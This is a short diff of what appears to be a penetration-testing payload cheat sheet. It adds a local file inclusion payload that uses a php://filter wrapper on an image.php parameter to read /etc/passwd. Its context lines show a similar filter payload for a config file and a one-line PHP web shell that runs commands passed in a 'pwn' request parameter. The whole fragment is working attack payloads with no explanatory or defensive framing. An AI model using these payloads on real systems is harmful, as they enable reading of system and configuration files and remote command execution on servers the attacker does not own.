@@ -4,6 +4,8 @@
 
 php://filter/convert.base64-encode/resource=config
 
+image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd
+
 # CMD
     <?php system($_REQUEST['pwn']); ?>
 
